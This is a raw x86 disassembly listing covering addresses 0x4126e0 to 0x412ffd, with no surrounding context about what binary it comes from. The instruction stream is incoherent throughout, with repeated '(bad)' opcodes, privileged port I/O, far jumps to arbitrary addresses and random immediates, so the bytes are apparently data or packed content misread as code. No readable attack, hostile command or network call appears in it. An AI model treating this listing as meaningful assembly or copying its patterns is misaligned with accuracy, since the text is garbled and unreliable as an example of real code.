  4126e0:	add    BYTE PTR [eax],al
  4126e2:	into   
  4126e3:	paddusb mm6,QWORD PTR [edi+0x295c86a1]
  4126ea:	inc    ebp
  4126eb:	add    eax,0x44337e10
  4126f0:	(bad)  
  4126f2:	stc    
  4126f3:	dec    esi
  4126f4:	jmp    0xc5121737
  4126f9:	adc    ebp,DWORD PTR [eax-0x26308df0]
  4126ff:	clc    
  412700:	outs   dx,DWORD PTR ds:[esi]
  412701:	iret   
  412702:	frndint 
  412704:	pop    edi
  412705:	(bad)  
  412706:	fxtract 
  412708:	pop    ebx
  412709:	or     BYTE PTR ds:0xc103e7aa,0x8a
  412710:	in     al,0xff
  412712:	std    
  412713:	and    DWORD PTR [esi+0xc],ebx
  412716:	or     DWORD PTR [edx+0x21edffdc],0x96f2c01
  412720:	adc    ch,BYTE PTR [eax+edx*8]
  412723:	adc    BYTE PTR [edx],al
  412725:	sub    al,0x7a
  412727:	dec    ecx
  412728:	call   0x924621c8
  41272d:	push   es
  41272e:	or     DWORD PTR [edx],esp
  412730:	jno    0x41272c
  412732:	jo     0x412714
  412734:	dec    edi
  412735:	jge    0x4127b6
  412737:	in     al,0xe4
  412739:	add    edi,edx
  41273b:	add    eax,0xe91185ae
  412740:	fadd   QWORD PTR [edx]
  412742:	imul   DWORD PTR es:[ebx+0x29]
	...
  412756:	add    BYTE PTR [eax],al
  412758:	add    al,0x88
  41275a:	sub    cl,BYTE PTR cs:[ecx+eiz*1-0x2f8d03af]
  412762:	add    al,0xc
  412764:	jae    0x412726
  412766:	or     al,0x14
  412768:	or     eax,0xb880e004
  41276e:	or     al,0x14
  412770:	jno    0x412742
  412772:	add    al,0xc
  412774:	mov    ebp,0xd093ffc2
  412779:	rol    DWORD PTR [ebx],1
  41277b:	pusha  
  41277c:	dec    esi
  41277d:	mov    esi,0x46ee2d82
  412782:	psubsw mm6,QWORD PTR [esi+0x2d]
  412786:	aaa    
  412787:	push   0x62
  412789:	in     eax,0x43
  41278b:	jmp    0x7d31b5db
  412790:	and    dh,dl
  412792:	mov    edi,0x3745769f
  412797:	sub    eax,DWORD PTR [esi]
  412799:	add    eax,0xe12da58b
  41279e:	test   BYTE PTR [ecx-0x4e7cf4ac],ch
  4127a4:	sar    BYTE PTR [edi+0x46e1ad82],cl
  4127aa:	pop    ss
  4127ab:	jmp    0x2d64f41e
  4127b0:	gs dec ebp
  4127b2:	jae    0x412783
  4127b4:	pop    esi
  4127b5:	mov    ah,0x23
  4127b7:	and    eax,0xc7733655
	...
  4127cc:	add    BYTE PTR [eax],al
  4127ce:	push   eax
  4127cf:	mov    dl,BYTE PTR [ebx]
  4127d1:	in     eax,dx
  4127d2:	stc    
  4127d3:	add    al,0x48
  4127d5:	jo     0x412852
  4127d7:	add    BYTE PTR [ecx+ebp*8],al
  4127da:	stc    
  4127db:	lea    ecx,[ebp-0x1df5207]
  4127e1:	inc    ecx
  4127e2:	add    ebx,DWORD PTR [ebx]
  4127e4:	in     eax,dx
  4127e5:	push   edx
  4127e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127e7:	dec    ebp
  4127e8:	push   esi
  4127e9:	out    0xb,al
  4127eb:	pop    ebp
  4127ec:	(bad)  
  4127ed:	fdivr  DWORD PTR [eax-0x71d630e0]
  4127f3:	inc    edi
  4127f4:	push   cs
  4127f5:	xchg   edi,eax
  4127f6:	adc    BYTE PTR ds:0x35f9a810,al
  4127fc:	mov    edi,0xb60ebb1a
  412801:	add    BYTE PTR [edx+0xa],bh
  412804:	adc    BYTE PTR [ecx+0x53],al
  412807:	mov    bl,0xbe
  412809:	xor    esp,DWORD PTR [ebx*1-0xb9f464c]
  412810:	inc    eax
  412811:	add    BYTE PTR [edx],al
  412813:	les    eax,FWORD PTR [ecx-0x3ae6a83f]
  412819:	or     DWORD PTR [edx],0x23000104
  41281f:	pop    edx
  412820:	mov    DWORD PTR [ebp-0x447ce32d],0x5300042a
  41282a:	call   0xc083:0x174e8cf5
  412831:	sbb    BYTE PTR [eax],al
	...
  412843:	add    BYTE PTR [ebx+0x6],dh
  412846:	add    BYTE PTR [edi+0x913],bh
  41284c:	pop    esi
  41284d:	push   ecx
  41284e:	call   DWORD PTR [edx+ebx*2-0x6]
  412852:	xor    al,al
  412854:	(bad)  
  412855:	add    eax,DWORD PTR [eax]
  412857:	add    bl,dl
  412859:	call   0x0:0x627c727
  412860:	jecxz  0x412865
  412862:	add    BYTE PTR [ebx+0x3d0493],al
  412868:	xlat   BYTE PTR ds:[ebx]
  412869:	add    eax,DWORD PTR [eax]
  41286b:	jb     0x4128ec
  41286d:	mov    eax,eax
  41286f:	add    BYTE PTR [edi+0x52830003],dl
  412875:	add    al,0x2b
  412877:	sti    
  412878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412879:	ror    DWORD PTR [ecx-0x1e04872],1
  41287f:	call   FWORD PTR [eax]
  412881:	jae    0x84e3454f
  412887:	and    al,0x97
  412889:	add    eax,DWORD PTR [eax]
  41288b:	mov    edx,edi
  41288d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41288e:	sti    
  41288f:	add    edi,edx
  412891:	sub    eax,0x31fe9d7b
  412896:	add    al,BYTE PTR [eax]
  412898:	jae    0x412839
  41289a:	test   DWORD PTR [ebx],0x397b2dfa
  4128a0:	cmp    DWORD PTR [edi+0x2dfa040f],0x9579
	...
  4128ba:	jmp    0xdbb7:0x83000229
  4128c1:	add    edi,edx
  4128c3:	sub    eax,0x71730878
  4128c8:	ficomp WORD PTR [ebx]
  4128ca:	jno    0x412935
  4128cc:	ficom  WORD PTR [ebx-0x7e]
  4128cf:	and    eax,DWORD PTR [ebx]
  4128d1:	sahf   
  4128d2:	out    0x29,al
  4128d4:	add    al,BYTE PTR [eax]
  4128d6:	sti    
  4128d7:	xchg   DWORD PTR [edx],edx
  4128d9:	add    al,0xfa
  4128db:	sub    eax,0x107688ba
  4128e0:	adc    al,0x89
  4128e2:	outs   dx,BYTE PTR ds:[esi]
  4128e3:	or     BYTE PTR [ecx+ecx*4],cl
  4128e6:	test   BYTE PTR [eax],ch
  4128e8:	(bad)  
  4128e9:	(bad)  
  4128ea:	fst    QWORD PTR [ebp+0x133223c6]
  4128f0:	inc    ecx
  4128f1:	push   cs
  4128f2:	je     0x41294f
  4128f4:	std    
  4128f5:	inc    ebp
  4128f7:	cdq    
  4128f8:	mov    edi,edi
  4128fa:	mov    ebp,0x3e8b022c
  4128ff:	push   eax
  412900:	mov    BYTE PTR [edx+edi*4+0x368ae9f8],0x50
  412908:	or     al,BYTE PTR [ecx+0x73]
  41290b:	lock fist WORD PTR [edi]
  41290e:	jle    0x412975
  412910:	scas   eax,DWORD PTR es:[edi]
  412911:	sub    al,0x81
  412913:	clc    
  412914:	fistp  WORD PTR [edi+0x71]
  412917:	add    eax,0x4f61377
  41291c:	jmp    0x4129fb
	...
  41292d:	add    BYTE PTR [eax],al
  41292f:	add    cl,al
  412931:	call   0x77c1faee
  412936:	hlt    
  412937:	jmp    DWORD PTR [ebp+0x1e]
  41293a:	adc    eax,edx
  41293c:	sbb    DWORD PTR [ebp-0x173e8569],esi
  412942:	xchg   esp,eax
  412943:	shr    DWORD PTR [edx+0x3982181d],1
  412949:	cmc    
  41294a:	imul   eax,DWORD PTR [ebx-0x14],0xffffff88
  41294e:	xchg   ebx,eax
  41294f:	(bad)  
  412950:	xor    eax,0xd9c7d11e
  412955:	add    BYTE PTR [ecx+edx*1-0x40334e8f],dl
  41295c:	jo     0x412917
  41295e:	(bad)
  412962:	int3   
  412963:	xlat   BYTE PTR ds:[ebx]
  412964:	cmp    BYTE PTR [ecx-0x1ef243c],0x71
  41296b:	rcr    cl,0xb8
  41296e:	jno    0x4129e6
  412970:	or     DWORD PTR [ecx],ecx
  412972:	jmp    0x38834a7a
  412977:	ror    DWORD PTR [edx-0x70],1
  41297a:	sbb    al,0xe0
  41297c:	sub    DWORD PTR [ebx-0x7e22c98f],esi
  412982:	mov    cl,0x25
  412984:	int3   
  412985:	mov    DWORD PTR [eax+eiz*8],edi
  412988:	adc    DWORD PTR [edx-0x6f12fd5d],eax
  41298e:	inc    esi
  41298f:	push   DWORD PTR [ebp+0x7e611d]
	...
  4129a5:	add    cl,bl
  4129a7:	or     cl,ch
  4129a9:	add    edi,DWORD PTR [ebp-0x5f03338]
  4129af:	add    al,0xe9
  4129b1:	add    edx,ebx
  4129b3:	enter  0xccff,0xb1
  4129b7:	cwde   
  4129b8:	popa   
  4129b9:	push   0xffffffdf
  4129bb:	add    al,0xf
  4129bd:	outs   dx,DWORD PTR ds:[esi]
  4129be:	test   al,0x2
  4129c0:	add    cl,ch
  4129c2:	pusha  
  4129c3:	shl    DWORD PTR [ebx],0x11
  4129c6:	add    DWORD PTR [bx-0x16],0xad8b04f9
  4129ce:	cmp    eax,0xbf12570d
  4129d3:	mov    dl,0x4f
  4129d5:	bound  eax,QWORD PTR [esi+eiz*1]
  4129d8:	loope  0x412a0f
  4129da:	pop    ds
  4129db:	pop    ds
  4129dc:	mov    dh,BYTE PTR [ebp-0x47a92ae3]
  4129e2:	mov    dl,0x4f
  4129e4:	mov    dh,BYTE PTR [ecx]
  4129e6:	push   cs
  4129e7:	push   edx
  4129e8:	test   BYTE PTR [esi],0xdf
  4129eb:	fcmovb st,st(2)
  4129ed:	mul    BYTE PTR [eax+eax*1-0x760616fd]
  4129f4:	inc    ebx
  4129f5:	int    0x21
  4129f7:	loopne 0x4129f8
  4129f9:	jecxz  0x4129f4
  4129fb:	add    al,0x7c
  4129fd:	lock jp 0x412a1e
  412a00:	add    esi,ebp
  412a02:	jne    0x412a11
  412a04:	add    ebp,ecx
  412a06:	stc    
  412a07:	fcos   
  412a09:	dec    ebx
	...
  412a1a:	add    BYTE PTR [eax],al
  412a1c:	inc    BYTE PTR [esp+edi*2]
  412a1f:	lock jp 0x412a3d
  412a22:	add    ch,dh
  412a24:	push   ebp
  412a25:	sbb    eax,0x8ff9e901
  412a2a:	pop    ebx
  412a2b:	add    eax,0xcd438fb6
  412a30:	lods   eax,DWORD PTR ds:[esi]
  412a31:	(bad)  
  412a32:	xchg   ebp,eax
  412a33:	cmc    
  412a34:	mov    ch,0x1c
  412a36:	inc    dl
  412a38:	cmp    cl,BYTE PTR [ebp-0x3b663abd]
  412a3e:	dec    edi
  412a3f:	add    BYTE PTR [esi],ah
  412a41:	pop    ebp
  412a42:	call   DWORD PTR [eax-0x1f]
  412a45:	mov    eax,DWORD PTR ss:[edi+edi*4+0x54]
  412a4a:	dec    esi
  412a4b:	mov    esp,DWORD PTR [ebp+0x0]
  412a4e:	(bad)  
  412a50:	adc    al,0xe1
  412a52:	mov    DWORD PTR [edi+edi*8+0x38],ecx
  412a56:	aaa    
  412a57:	dec    esp
  412a58:	inc    DWORD PTR [eax-0x75]
  412a5b:	inc    ebx
  412a5c:	push   edx
  412a5d:	lahf   
  412a5e:	inc    edx
  412a5f:	and    al,0x57
  412a61:	dec    ebx
  412a62:	jp     0x412a9d
  412a64:	enter  0x50b6,0x8b
  412a68:	adc    eax,0x14f74300
  412a6d:	loope  0x4129f8
  412a6f:	dec    esp
  412a70:	das    
  412a71:	dec    eax
  412a72:	xchg   DWORD PTR [edi+edi*1+0x3c],eax
  412a76:	mov    DWORD PTR [edi+edi*1+0x5c],eax
  412a7a:	dec    esi
  412a7b:	push   ecx
  412a7c:	cwde   
  412a7d:	shl    esi,1
  412a7f:	das    
	...
  412a90:	add    BYTE PTR [eax],al
  412a92:	sbb    al,0xe8
  412a94:	std    
  412a95:	mov    esp,DWORD PTR [edi+0x3c]
  412a98:	and    ch,BYTE PTR [ebx]
  412a9a:	fild   DWORD PTR [ecx+ecx*8]
  412a9d:	mov    eax,0x38e1924a
  412aa2:	sbb    al,0xea
  412aa4:	iret   
  412aa5:	cli    
  412aa6:	push   0xe4e8bfc3
  412aab:	add    al,dl
  412aad:	jmp    0x412ab2
  412aaf:	mov    WORD PTR [edx+0x24],cs
  412ab2:	pop    es
  412ab3:	push   edx
  412ab4:	mov    esi,ecx
  412ab6:	stos   DWORD PTR es:[edi],eax
  412ab7:	or     edi,esi
  412ab9:	inc    DWORD PTR [ebx+ecx*4-0x73e0dbae]
  412ac0:	(bad)  
  412ac1:	mov    ecx,DWORD PTR [edi]
  412ac3:	sub    eax,0x8bf3523e
  412ac8:	int3   
  412ac9:	call   0xfe5aa6c8
  412ace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412acf:	inc    esi
  412ad0:	cmp    cl,BYTE PTR [edx+0x23bf96b9]
  412ad6:	xor    ah,BYTE PTR [ebp+0x2ef9e186]
  412adc:	inc    esp
  412add:	rol    BYTE PTR [edx-0x29bbfad1],0x69
  412ae4:	fucom  st(7)
  412ae6:	not    DWORD PTR ds:0x1a164349
  412aec:	add    eax,DWORD PTR [eax]
  412aee:	cli    
  412aef:	sub    eax,0x5e4fe87
  412af4:	(bad)  [ebx+0x0]
	...
  412b07:	add    BYTE PTR [esi],bl
  412b09:	bound  ebx,QWORD PTR [esi-0x199e7ed1]
  412b0f:	daa    
  412b10:	scas   eax,DWORD PTR es:[edi]
  412b11:	jl     0x412aa0
  412b13:	int    0x52
  412b15:	mov    ds:0x9635fe19,eax
  412b1a:	mov    bh,0x23
  412b1c:	mov    dh,0xa6
  412b1e:	cmp    ecx,DWORD PTR [edx+0x51c241be]
  412b24:	retf   0x5196
  412b27:	out    0x61,eax
  412b29:	adc    esp,DWORD PTR [ecx]
  412b2b:	(bad)  
  412b2c:	shr    esi,1
  412b2e:	mov    ds,WORD PTR [ebx-0x22]
  412b31:	jne    0x412ad2
  412b33:	pop    es
  412b34:	xor    eax,0xfb13e7e9
  412b39:	sub    eax,DWORD PTR [edx]
  412b3b:	add    BYTE PTR [edi+0x33],dh
  412b3e:	xchg   edi,eax
  412b3f:	dec    esp
  412b40:	and    ebx,eax
  412b42:	out    0x43,eax
  412b44:	pop    edi
  412b45:	jmp    0x412ad5
  412b47:	(bad)  
  412b48:	out    dx,al
  412b49:	pop    ds
  412b4a:	add    al,BYTE PTR [eax]
  412b4c:	pusha  
  412b4d:	sub    eax,0x7a7150b5
  412b52:	sub    bl,BYTE PTR [esi+0x22a605c9]
  412b58:	xor    BYTE PTR [ecx+0x3d80c7c4],0x61
  412b5f:	(bad)  
  412b60:	fld    st(4)
  412b62:	cmp    dh,BYTE PTR [eax+esi*2-0x704f6fb5]
  412b69:	sbb    bh,BYTE PTR [ebp-0x72]
	...
  412b7c:	add    BYTE PTR [eax],al
  412b7e:	inc    ecx
  412b7f:	loope  0x412b41
  412b81:	mov    eax,0x909e8e2a
  412b86:	and    ebp,edi
  412b88:	out    0x2b,eax
  412b8a:	rcl    DWORD PTR [edx],1
  412b8c:	pop    ebp
  412b8d:	and    dh,BYTE PTR [eax]
  412b8f:	cmp    eax,0xbd19bf61
  412b94:	into   
  412b95:	or     eax,0xf80cc135
  412b9a:	push   ebp
  412b9b:	sbb    ch,al
  412b9d:	add    esp,DWORD PTR [ecx+0xe]
  412ba0:	push   0xffffff9f
  412ba2:	sbb    ecx,esi
  412ba4:	call   0xe98ca2bb
  412ba9:	add    edi,edx
  412bab:	test   DWORD PTR [ebx],ebx
  412bad:	add    eax,0x4418afd
  412bb2:	cli    
  412bb3:	add    al,0x62
  412bb5:	mov    bh,0xd9
  412bb7:	in     al,0x71
  412bb9:	mov    ecx,ebp
  412bbb:	add    cl,ch
  412bbd:	add    edi,DWORD PTR [ecx+0x47]
  412bc0:	div    BYTE PTR [eax+edi*2+0x78b6ea46]
  412bc7:	inc    ebp
  412bc8:	jmp    0x4ae0:0x4c886b3
  412bcf:	mov    fs,WORD PTR [esi-0x32e48ad4]
  412bd5:	and    DWORD PTR [eax-0x40],esi
  412bd8:	or     al,0xd4
  412bda:	adc    cl,al
  412bdc:	add    al,0xec
  412bde:	xor    BYTE PTR [eax+0xcff],0x0
	...
  412bf1:	add    BYTE PTR [eax],al
  412bf3:	add    BYTE PTR [edx-0x7960754d],ah
  412bf9:	popf   
  412bfa:	and    dl,BYTE PTR [ecx-0x6101eeeb]
  412c00:	jg     0x412c33
  412c02:	mov    ch,BYTE PTR ds:0x3954e192
  412c08:	outs   dx,DWORD PTR ds:[esi]
  412c09:	inc    edi
  412c0a:	out    0x97,eax
  412c0c:	in     eax,dx
  412c0d:	sbb    bh,dh
  412c0f:	shl    BYTE PTR [esi],cl
  412c11:	jge    0x412b95
  412c13:	mov    edi,edi
  412c15:	add    eax,0x452e62c2
  412c1a:	clc    
  412c1b:	jmp    0x412c43
  412c1d:	in     al,dx
  412c1e:	out    0x43,eax
  412c20:	add    eax,0x2662fe1b
  412c25:	pop    DWORD PTR [ebx+0x5]
  412c28:	dec    esi
  412c29:	mov    al,0x4f
  412c2b:	jb     0x412bd5
  412c2d:	and    edx,ecx
  412c2f:	xor    al,0x1b
  412c31:	sbb    ecx,DWORD PTR [edx+0x24e5721]
  412c37:	and    BYTE PTR [esi+0x2872a12c],bl
  412c3d:	adc    ch,al
  412c3f:	cmp    BYTE PTR [edi+ecx*4],cl
  412c42:	leave  
  412c43:	sub    cl,dl
  412c45:	cli    
  412c46:	add    ah,BYTE PTR [ebx]
  412c48:	outs   dx,DWORD PTR ds:[esi]
  412c49:	lds    esp,FWORD PTR [ebx]
  412c4b:	mov    ebp,0x103a4cfe
  412c50:	ins    DWORD PTR es:[edi],dx
  412c51:	add    edi,eax
  412c53:	lods   eax,DWORD PTR ds:[esi]
  412c54:	sbb    eax,0xe900f5
	...
  412c69:	add    cl,bh
  412c6b:	add    al,0x85
  412c6d:	out    0x93,al
  412c6f:	loopne 0x412cab
  412c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c72:	(bad)  
  412c73:	in     al,0x8a
  412c75:	cmp    eax,0x3b4fe8d2
  412c7a:	outs   dx,DWORD PTR ds:[esi]
  412c7b:	dec    edx
  412c7c:	out    0x0,eax
  412c7e:	dec    ebp
  412c7f:	out    dx,eax
  412c80:	std    
  412c81:	dec    DWORD PTR [eax-0x24]
  412c84:	mov    DWORD PTR [edi+esi*8+0x28],eax
  412c88:	push   ebx
  412c89:	push   eax
  412c8a:	pop    eax
  412c8b:	mov    dh,0xe6
  412c8d:	jg     0x412c25
  412c8f:	in     eax,0xfd
  412c91:	cmp    edi,DWORD PTR [ebx-0x6ffd740b]
  412c97:	add    al,0x0
  412c99:	sub    edi,0x2c
  412c9c:	adc    al,BYTE PTR [eax]
  412c9e:	mov    WORD PTR [edi-0xb],?
  412ca1:	add    ah,BYTE PTR [ebx-0x6f027cfc]
  412ca7:	cmc    
  412ca8:	(bad)  
  412ca9:	aam    0x93
  412cab:	add    al,0x0
  412cad:	mov    ebp,DWORD PTR [edi-0x5874e1e0]
  412cb3:	and    BYTE PTR [esi-0x75],dl
  412cb6:	aad    0xf
  412cb8:	add    al,BYTE PTR [eax]
  412cba:	push   ebx
  412cbb:	cmp    DWORD PTR [edi-0x3f7e8d03],0xbe817103
  412cc5:	add    esp,DWORD PTR [ebx-0x79]
  412cc8:	dec    edx
  412cc9:	and    al,0x4f
  412ccb:	push   ebx
  412ccc:	mov    esi,ecx
	...
  412cde:	add    BYTE PTR [eax],al
  412ce0:	or     edi,DWORD PTR [ebx-0x76f3000a]
  412ce6:	inc    edx
  412ce7:	and    al,0x43
  412ce9:	mov    DWORD PTR [edx+0x24],edx
  412cec:	inc    edi
  412ced:	mov    DWORD PTR [edx+0x24],ebx
  412cf0:	sub    edi,DWORD PTR [ecx]
  412cf2:	rcl    DWORD PTR [edx-0x78],0xb5
  412cf6:	dec    esi
  412cf7:	jl     0x412d2f
  412cf9:	in     al,dx
  412cfa:	and    dh,ch
  412cfc:	or     al,0xf8
  412cfe:	push   ebx
  412cff:	push   ebx
  412d00:	push   0xf74487c7
  412d05:	adc    al,0xe6
  412d07:	pop    ss
  412d08:	cli    
  412d09:	cmp    BYTE PTR [esi],bl
  412d0b:	(bad)  
  412d0c:	jno    0x412d07
  412d0e:	out    0x23,eax
  412d10:	and    DWORD PTR [ebp+0x7c],ebp
  412d13:	sbb    al,0x2a
  412d16:	add    edx,eax
  412d18:	jno    0x412d7f
  412d1a:	inc    esp
  412d1b:	clc    
  412d1c:	clc    
  412d1d:	inc    edx
  412d1e:	out    dx,eax
  412d1f:	out    0xb5,eax
  412d21:	jns    0x412d41
  412d23:	inc    BYTE PTR [edi-0x25]
  412d26:	mov    cl,ch
  412d28:	jae    0x412d13
  412d2a:	out    0x2b,eax
  412d2c:	xchg   edx,eax
  412d2d:	jnp    0x412d46
  412d2f:	(bad)  
  412d30:	xchg   ebp,eax
  412d31:	xchg   edx,eax
  412d32:	dec    ebx
  412d33:	mov    dh,BYTE PTR [esi]
  412d35:	inc    edx
  412d36:	out    0x2a,al
  412d38:	mov    dl,0x2a
  412d3a:	dec    ebx
  412d3b:	mov    bh,0x93
  412d3d:	retf   
  412d3e:	mov    ch,BYTE PTR ds:0xf934b46d
	...
  412d54:	add    BYTE PTR [eax],al
  412d56:	adc    ebx,0x2b05e844
  412d5c:	dec    eax
  412d5d:	mov    dh,BYTE PTR [esi+0x4202d801]
  412d63:	add    ch,BYTE PTR ds:0xc7df027c
  412d69:	and    ebp,esi
  412d6b:	sub    al,0x2
  412d6d:	add    dl,bh
  412d6f:	mov    al,ds:0x22e2751e
  412d74:	inc    edi
  412d75:	jnp    0x412d4d
  412d77:	xchg   edx,eax
  412d78:	mov    bh,0x23
  412d7a:	jmp    0x5505:0x2c8ab05d
  412d81:	repz adc eax,0x81d78afe
  412d87:	popa   
  412d88:	out    0x27,al
  412d8a:	scas   eax,DWORD PTR es:[edi]
  412d8b:	jge    0x412d16
  412d8d:	int    0x12
  412d8f:	retf   
  412d90:	pop    ss
  412d91:	(bad)  
  412d92:	cmc    
  412d93:	add    eax,0x88fc3c22
  412d98:	add    eax,DWORD PTR [edx]
  412d9a:	cli    
  412d9b:	add    al,0x6a
  412d9d:	lahf   
  412d9e:	sbb    ecx,esi
  412da0:	call   0xeb3cacb3
  412da5:	add    edi,edx
  412da7:	mov    DWORD PTR [eax+ebp*8],ebx
  412daa:	sub    eax,0x760eb580
  412daf:	stos   BYTE PTR es:[edi],al
  412db0:	out    0x3,eax
  412db2:	cli    
  412db3:	and    DWORD PTR [ebp+0x387efd04],0x5
	...
  412dc9:	add    BYTE PTR [eax],al
  412dcb:	add    dl,bh
  412dcd:	add    al,0x62
  412dcf:	mov    bh,0xd9
  412dd1:	mov    al,0x61
  412dd3:	dec    esi
  412dd4:	loopne 0x412e1f
  412dd6:	jae    0x412ddf
  412dd8:	add    dl,bl
  412dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ddb:	xchg   ebp,eax
  412ddc:	sti    
  412ddd:	mov    DWORD PTR [ebp-0x3b3e8f4d],ebp
  412de3:	mul    DWORD PTR [eax]
  412de5:	ss mov ecx,0x4c97eb3
  412deb:	loopne 0x412db7
  412ded:	mov    DWORD PTR [esi],esp
  412def:	mov    ecx,es
  412df1:	loopne 0x412df7
  412df3:	sub    al,0x41
  412df5:	push   cs
  412df6:	inc    ebp
  412df7:	push   ds
  412df8:	adc    bl,BYTE PTR [ecx-0x2f3427fc]
  412dfe:	popa   
  412dff:	mov    bh,0x19
  412e01:	aad    0x95
  412e03:	mov    cl,0x80
  412e05:	inc    edi
  412e06:	adc    al,ah
  412e08:	sub    DWORD PTR [esi],edx
  412e0a:	sbb    eax,0xac8a4d8a
  412e0f:	out    0xe5,eax
  412e11:	lods   eax,DWORD PTR ds:[esi]
  412e12:	mov    eax,0xd62d478a
  412e17:	pop    ss
  412e18:	or     al,0x16
  412e1a:	rol    DWORD PTR [edx+0x70],0xb9
  412e1e:	dec    esp
  412e20:	add    eax,0xc5620f98
  412e25:	loope  0x412e56
  412e27:	jb     0x412ddb
  412e29:	loope  0x412e5e
  412e2b:	jo     0x412df7
  412e2d:	loope  0x412e66
  412e2f:	pusha  
	...
  412e40:	add    BYTE PTR [eax],al
  412e42:	mov    ds:0xc2623be1,al
  412e47:	loope  0x412e58
  412e49:	push   ds
  412e4a:	mov    eax,ebp
  412e4c:	mov    ch,BYTE PTR [edi-0x490f20ea]
  412e52:	fisttp WORD PTR [edx-0x5129fab5]
  412e58:	push   eax
  412e59:	jb     0x412e97
  412e5b:	mov    edx,edi
  412e5d:	xchg   ecx,eax
  412e5e:	add    DWORD PTR [ebx],edx
  412e60:	(bad)  
  412e61:	xchg   esi,eax
  412e62:	ret    
  412e63:	inc    edx
  412e64:	push   cs
  412e65:	pop    esp
  412e66:	pop    ds
  412e67:	push   ss
  412e68:	(bad)  
  412e69:	jmp    0xd164e7f0
  412e6e:	mov    ds:0xf9ed2377,al
  412e73:	add    al,0x75
  412e75:	adc    DWORD PTR [ebx-0x7d02dc4f],eax
  412e7b:	shl    DWORD PTR [ebx],0xf9
  412e7e:	scas   al,BYTE PTR es:[edi]
  412e7f:	mov    bl,0x4f
  412e81:	bound  ebp,QWORD PTR [ebp+ebx*1+0x16f759f1]
  412e88:	push   esp
  412e89:	call   0xe95d:0xa5884782
  412e90:	out    0x2f,eax
  412e92:	jmp    0x412eaa
  412e94:	(bad)  
  412e95:	bound  ecx,QWORD PTR [edx-0x1f]
  412e98:	and    ebp,edx
  412e9a:	ror    DWORD PTR [edx-0x73c44b2e],0x4b
  412ea1:	int    0x11
  412ea3:	mov    bl,0x8a
  412ea5:	pop    ds
	...
  412eb6:	add    BYTE PTR [eax],al
  412eb8:	out    0x65,al
  412eba:	repnz add ah,dh
  412ebd:	test   DWORD PTR [ecx+0x224c88d8],0x89515c38
  412ec7:	into   
  412ec8:	sti    
  412ec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eca:	icebp  
  412ecb:	call   esp
  412ecd:	jge    0x412f39
  412ecf:	and    al,0xf7
  412ed1:	add    eax,0x1d0f8bd8
  412ed6:	and    bh,BYTE PTR [ebx]
  412ed8:	mov    al,ds:0x1b245a7d
  412edd:	jae    0x412f26
  412edf:	jmp    0x412ec0
  412ee1:	jge    0x412f3d
  412ee3:	and    al,0xeb
  412ee5:	jge    0x412f29
  412ee7:	and    al,0xab
  412ee9:	sub    eax,0x89f2484
  412eee:	add    BYTE PTR [ebp-0x56],dh
  412ef1:	test   DWORD PTR [eax+ebp*1+0x88f],edi
  412ef8:	out    dx,eax
  412ef9:	or     eax,0x89e003b
  412efe:	add    BYTE PTR [esi+ebx*4-0x7b],bh
  412f02:	std    
  412f03:	add    bh,BYTE PTR [edi+0x26]
  412f06:	jg     0x412f84
  412f08:	aas    
  412f09:	xor    dh,bh
  412f0b:	jl     0x412f70
  412f0d:	or     BYTE PTR [ebp+eax*1-0x30],bh
  412f11:	lock add DWORD PTR [eax+eiz*2+0x7d],esi
  412f16:	dec    edx
  412f17:	and    al,0xeb
  412f19:	pop    ecx
  412f1a:	dec    edi
  412f1b:	mov    eax,DWORD PTR [eax]
	...
  412f2d:	add    BYTE PTR ds:0x4f3cce0,al
  412f33:	icebp  
  412f34:	jmp    0x22950769
  412f39:	pop    eax
  412f3a:	cwde   
  412f3b:	dec    ebx
  412f3c:	and    dl,BYTE PTR [eax]
  412f3e:	test   al,0xd4
  412f40:	sub    edi,edx
  412f42:	popa   
  412f43:	pop    eax
  412f44:	mov    esi,ecx
  412f46:	cli    
  412f47:	add    eax,0x315ef6e
  412f4c:	sbb    al,0x43
  412f4e:	(bad)  
  412f4f:	sub    eax,0x98fbee7f
  412f54:	and    al,0xea
  412f56:	call   0xa64e601
  412f5b:	mov    cl,0xc7
  412f5d:	dec    BYTE PTR [ebx-0x30]
  412f60:	mov    cs,ebp
  412f62:	ror    BYTE PTR [edi-0x112201ed],cl
  412f68:	sbb    al,BYTE PTR [edx-0x70f6e129]
  412f6e:	jnp    0x412f8d
  412f70:	add    al,BYTE PTR [eax]
  412f72:	jno    0x412f1f
  412f74:	out    dx,eax
  412f75:	add    edi,edx
  412f77:	sbb    eax,0xa74a52af
  412f7c:	dec    ecx
  412f7d:	out    0xc,eax
  412f7f:	outs   dx,BYTE PTR ds:[esi]
  412f80:	sbb    bh,dh
  412f82:	jno    0x412f65
  412f84:	fbld   TBYTE PTR [edi]
  412f86:	inc    edi
  412f87:	int    0x8e
  412f89:	int    0x81
  412f8b:	push   ebp
  412f8c:	sub    ebp,edi
  412f8e:	mov    BYTE PTR [edx+0x3a1a],cl
	...
  412fa4:	mov    ecx,0x368aea12
  412fa9:	inc    edx
  412faa:	jmp    0x6dff:0xfe497c3a
  412fb1:	xor    BYTE PTR [ebx],cl
  412fb3:	and    DWORD PTR [ebp+esi*8+0x1dfaffff],0xffffff8e
  412fbb:	inc    esp
  412fbc:	pop    ss
  412fbd:	push   ds
  412fbe:	(bad)  
  412fbf:	(bad)  
  412fc0:	cli    
  412fc1:	dec    ecx
  412fc2:	inc    DWORD PTR [edx+0x68e1f47]
  412fc8:	call   FWORD PTR ds:0x6135ff97
  412fce:	aam    0x8a
  412fd0:	into   
  412fd1:	add    al,0xcd
  412fd3:	mov    ebx,0xefc4a072
  412fd8:	jbe    0x412ffb
  412fda:	pushf  
  412fdb:	jecxz  0x412f5d
  412fdd:	jp     0x412fd3
  412fdf:	dec    DWORD PTR ds:0x70b59913
  412fe5:	inc    edx
  412fe6:	adc    ch,ah
  412fe8:	or     eax,0xfa5bf513
  412fed:	add    al,0xe9
  412fef:	add    edi,ebx
  412ff1:	mov    bh,ah
  412ff3:	jmp    ebp
  412ff5:	adc    cl,BYTE PTR [edi]
  412ff7:	rcr    BYTE PTR [ecx],0xf9
  412ffa:	pop    ebx
  412ffb:	and    al,0x86
  412ffd:	mov    cl,0xeb
